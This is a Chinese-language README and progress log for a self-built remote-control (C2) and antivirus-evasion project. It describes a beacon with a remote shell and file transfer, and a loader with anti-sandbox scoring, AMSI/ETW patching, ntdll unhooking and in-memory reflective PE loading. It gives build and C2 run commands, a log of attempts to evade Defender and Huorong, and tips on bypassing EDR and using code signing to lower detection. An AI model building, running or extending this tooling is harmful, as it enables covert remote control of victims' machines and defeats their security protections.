# lab-c2 —— 远控(C2) + 免杀 靶场工程

靶场自用：一台 C2 控制器 + 一个 HTTP 信标 + 一个带内存加载的载体(loader)。
**2026-10-04 大幅更新**：载荷路径已从"依赖 donut"改成**自研反射式 PE 映射**，并补齐了
无头控制面、观测面与三条自启/保活链路。

> 目录约定：工作根目录 `C:\Users\20751\Desktop\免杀远控\`；本工程在 `lab-c2\`；
> 证据与靶机脚本在 `lab-c2\runs\`（见 `runs\README.md` 索引）；总记录在上级 `工程日志.md`。

## 组件与职责

```
lab-c2/
  c2_server.py            控制器: 会话注册 / 任务队列 / 结果回收 / 交互台 / 本地控制 API
  build.bat               x64 构建(ASCII-only, 禁止写中文, 原因见文件头注释)
  implant/
    beacon.cpp            HTTP 信标: 心跳(带抖动) / 拉任务 / 回传 / shell / 上下行文件
    loader.cpp            载体: 单实例守卫 → 反调试/反沙箱打分 → 解密 → 反射式 PE 映射
    syscall.hpp           直接&间接系统调用 + FNV-1a 哈希 + AMSI/ETW patch + ntdll 反 hook
    ekko.hpp              休眠混淆(sleep mask) + RC4      ← Ekko 全量版(ROP 链)仍未实现
    c2conf.h              (生成物) C2 地址/端口/协议        由 tools/setcfg.py 生成
    payload.h             (生成物) RC4 密文载荷 + key       由 tools/enc.py 生成
  tools/
    enc.py                RC4 加密任意载荷 → payload.h
    setcfg.py             生成 c2conf.h
    c2ctl.py              无头控制 CLI: sessions / exec / dl / ul / sleep / kill / results
    selftest.py           无编译器自检(RC4 向量 / 往返 / payload.h / 服务端导入)
    smoketest.py          端到端冒烟(注册 → 下发 → 回传 → UA 指纹校验)
    run_beacon_test.ps1   一轮完整实验: 可选重建 → 推送 → WMI 启动 → 等活会话 → 下发一条命令
    webcheck.py           浏览器通道自检(Playwright + 本机 Chrome)
    pagelinks.py          读 JS 渲染页面的下载/接口链接
    getfile.py            接住浏览器触发的下载(火绒官网就是这种)
  runs/                   证据、靶机脚本、日志（详细索引见 runs/README.md）
  downloads/              安装包（火绒 x64 6.0.12.1）
  build/                  编译产物
```

## 原理：为什么这样分层

1. **信标/载荷分离**：网络协议(pull 模型)与执行载荷解耦。改协议不动载荷，改载荷不动协议。
2. **静态签名看数据，动态检测看调用**：静态层无明文字符串、无可疑导入、载荷全程密文；
   动态层页保护与内存分配走直接系统调用，用户态钩子被还原，AMSI/ETW 被抹掉。
3. **载荷不落地**（2026-10-04 起的新路径）：**不需要 donut/sRDI**。把 `beacon.exe` 整体
   RC4 加密内嵌，运行时解密到堆上，再在内存里完成 映射 → 重定位 → 修导入 → 段权限还原 →
   起线程跑 `mainCRTStartup`。磁盘上永远没有解密后的 PE。

## 构建与运行

```bat
:: 在 x64 Native Tools 环境(或先 call vcvars64.bat)
build.bat                        :: 默认载荷 build\beacon.exe (PE 路径)
build.bat build\beacon.exe force :: force = /DLCS_FORCE_RUN, 门禁只落痕不拦截
build.bat some.bin               :: 传 .bin(位置无关 shellcode) 则走早鸟 APC 通道
```

```powershell
python c2_server.py --host 0.0.0.0 --port 8080          # 起 C2
python tools/c2ctl.py sessions                          # 看会话(带心跳年龄/在线判定)
python tools/c2ctl.py exec '6:vix:s1' 'whoami /priv'    # 下发命令(务必带 sid!)
python tools/c2ctl.py results 3 '6:vix:s1'              # 取回显(不带 sid 会取错会话)
python tools/selftest.py ; python tools/smoketest.py    # 自检
```

> **控制面为什么存在**：交互台读 stdin，无头运行时拿不到输入；`/api/v1/ctl` 只允许
> `127.0.0.1`，把"下发任务/取会话/取结果"做成可脚本化接口。

## 实测坑清单（全部有证据，别重犯）

| 坑 | 现象 | 解法 |
|---|---|---|
| SDK 掏空结构体 | SDK 10.0.26100 的 `winternl.h` 把 `_PEB_LDR_DATA`/`_LDR_DATA_TABLE_ENTRY` 字段换成 `Reserved*` → C2039 | `syscall.hpp` 自带 x64 真实布局声明 |
| bat 编码 | UTF-8 无 BOM 的中文 bat 被 936 解码吞字符 | bat 一律 ASCII-only |
| bat 行尾 | LF 行尾 → cmd 把 `REM` 当命令执行 | 一律 CRLF |
| bat 传参 | 经 `vmctl -script` 传参的 bat 必 `exit 255` | 零参数 + 路径硬编码 |
| `.rdata` 合并 | `/MERGE:.rdata=.text` 让密文落在 RX 页 → 原地 RC4 直接 AV | 解密到 RW 堆 |
| 模态弹窗 | `MessageBoxW` 在无人值守桌面吊死进程，连带 `runProgramInGuest` | `MessageBoxTimeoutW` + `Sleep` 兜底 |
| 门禁误判 | `cpu<2` 命中自家单 vCPU 靶机；重启后 `uptime<10min` 又凑够阈值 | 打分模型 v2：弱分≥3 或任一强指标才拦 |
| 单实例范围 | 机器级互斥把交互会话的强实例挡在门外；跨用户还会 `ACCESS_DENIED` | v3：按会话命名 + 判 183/5 |
| 子进程相对名 | 计划任务拉起的实例环境无 PATH → `CreateProcess 失败` | 用 `%SystemRoot%\System32\cmd.exe` 绝对路径 |
| 会话检索 | `results` 不带 sid 会命中残留会话，误判"任务没执行" | 一律显式指定 sid |
| WMI rc=8 | 不是 WMI 坏：是 Defender 拦"用户可写目录里新落地的 exe"（连 `cmd.exe` 副本也拦） | 加排除项后立刻 `rc=0`（迭代期措施，最终须回滚）|

## 当前状态（2026-10-04 18:30，暂停在"装火绒"半步）

- **远控：成立。** 高完整性管理员会话（`SeDebugPrivilege` 等 Enabled），10 分钟浸泡零掉线，
  重启后由 `lcs_onstart` 自行恢复；双实例（`6:vix:s0` / `6:vix:s1`）按会话隔离。
- **免杀：未成立。** Defender 行为引擎 `Trojan:Win32/Bearfoos.B!ml` 曾于 69 秒后终结进程；
  静态判定随构建漂移（曾出现 `Sabsik.EN.A!ml` / `Wacatac.H!ml` / 干净）。
- **火绒那一轮：停在"点安装按钮"**。x64 包已进靶机（`C:\Users\Public\huorong64.exe`），
  向导已在桌面打开，但：VIX 按键注入被宿主权限拒、UIA 看不到自绘按钮、合成鼠标点击未生效。
  剩下的动作是**人工点一下「極速安裝」**。
- 迭代期给靶机加的 `C:\Users\Public` Defender 排除项**仍在位**，最终验收前必须回滚：
  `Remove-MpPreference -ExclusionPath C:\Users\Public`

## 注意（对抗有效性）

- 现代 EDR 校验 `syscall` 指令的返回地址是否在 ntdll 内：直接系统调用会被标记，优先间接模式。
- 用户态 patch（AMSI/ETW/unhook）只解决用户态挂钩，内核回调与 ETW-TI 看不见。
- 签名能显著降低 SmartScreen/Defender 启发式权重：
  `signtool sign /fd SHA256 /f cert.pfx /p PASS /tr http://timestamp.digicert.com /td SHA256 loader.exe`
